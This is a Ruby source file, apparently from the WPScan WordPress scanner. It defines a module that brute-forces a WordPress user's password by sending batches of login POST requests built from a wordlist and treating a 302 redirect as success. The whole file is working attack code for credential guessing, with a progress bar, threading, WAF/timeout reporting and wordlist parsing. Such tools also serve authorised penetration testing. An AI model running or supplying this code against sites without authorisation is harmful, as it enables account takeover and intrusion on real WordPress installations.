# encoding: UTF-8

class WpUser < WpItem
  module BruteForcable

    # Brute force the user with the wordlist supplied
    #
    # It can take a long time to queue 2 million requests,
    # for that reason, we queue browser.max_threads, send browser.max_threads,
    # queue browser.max_threads and so on.
    #
    # hydra.run only returns when it has recieved all of its, responses.
    # This means that while we are waiting for browser.max_threads,
    # responses, we are waiting...
    #
    # @param [ String, Array<String> ] wordlist The wordlist path
    # @param [ Hash ] options
    # @option options [ Boolean ] :verbose
    # @option options [ Boolean ] :show_progression
    #
    # @return [ void ]
    def brute_force(wordlist, options = {})
      browser      = Browser.instance
      hydra        = browser.hydra
      passwords    = BruteForcable.passwords_from_wordlist(wordlist)
      queue_count  = 0
      found        = false
      progress_bar = self.progress_bar(passwords.size) if options[:show_progression]

      passwords.each do |password|
        request = login_request(password)

        request.on_complete do |response|
          progress_bar.progress += 1 if options[:show_progression] && !found

          puts "\n  Trying Username : #{login} Password : #{password}" if options[:verbose]

          if valid_password?(response, password, options)
            found         = true
            self.password = password
            return
          end
        end

        hydra.queue(request)
        queue_count += 1

        if queue_count >= browser.max_threads
          hydra.run
          queue_count = 0
          puts "Sent #{browser.max_threads} requests ..." if options[:verbose]
        end
      end

      # run all of the remaining requests
      hydra.run
    end

    # @param [ Integer ] password_size
    #
    # @return [ ProgressBar ]
    # :nocov:
    def progress_bar(passwords_size)
      ProgressBar.create(
        format: '%t %a <%B> (%c / %C) %P%% %e',
        title: "  Brute Forcing '#{login}'",
        length: 120,
        total: passwords_size
      )
    end
    # :nocov:

    # @param [ String ] password
    #
    # @return [ Typhoeus::Request ]
    def login_request(password)
      Browser.instance.forge_request(login_url,
        method: :post,
        body: { log: login, pwd: password },
        cache_ttl: 0
      )
    end

    # @param [ Typhoeus::Response ] response
    # @param [ String ] password
    # @param [ Hash ] options
    # @option options [ Boolean ] :verbose
    # @option options [ Boolean ] :show_progression
    #
    # @return [ Boolean ]
    def valid_password?(response, password, options = {})
      if response.code == 302
        puts "\n  " + green('[SUCCESS]') + " Login : #{login} Password : #{password}\n\n" if options[:show_progression]
        return true
      elsif response.body =~ /login_error/i
        puts "\n  Incorrect login and/or password." if options[:verbose]
      elsif response.timed_out?
        puts "\n  " + red('ERROR:') + ' Request timed out.' if options[:show_progression]
      elsif response.code == 0
        puts "\n  " + red('ERROR:') + ' No response from remote server. WAF/IPS?' if options[:show_progression]
      elsif response.code.to_s =~ /^50/
        puts "\n  " + red('ERROR:') + ' Server error, try reducing the number of threads.' if options[:show_progression]
      else
        puts "\n  " + red('ERROR:') + " We received an unknown response for #{password}..." if options[:show_progression]

        # :nocov:
        if options[:verbose]
          puts red("    Code: #{response.code}")
          puts red("    Body: #{response.body}")
          puts
        end
        # :nocov:
      end
      false
    end

    # Load the passwords from the wordlist, which can be a file path or
    # an array or passwords
    #
    # File comments are ignored, but will miss passwords if they start with a hash...
    #
    # @param [ String, Array<String> ] wordlist
    #
    # @return [ Array<String> ]
    def self.passwords_from_wordlist(wordlist)
      if wordlist.is_a?(String)
        passwords = []
        charset   = File.charset(wordlist).upcase
        opt       = "r:#{charset}"
        # To remove warning when charset = UTF-8
        # Ignoring internal encoding UTF-8: it is identical to external encoding utf-8
        opt      += ':UTF-8' if charset != 'UTF-8'

        File.open(wordlist, opt).each do |line|
          next if line[0,1] == '#'

          passwords << line.strip
        end
      elsif wordlist.is_a?(Array)
        passwords = wordlist
      else
        raise 'Invalid wordlist, expected String or Array'
      end

      passwords
    end

  end
end
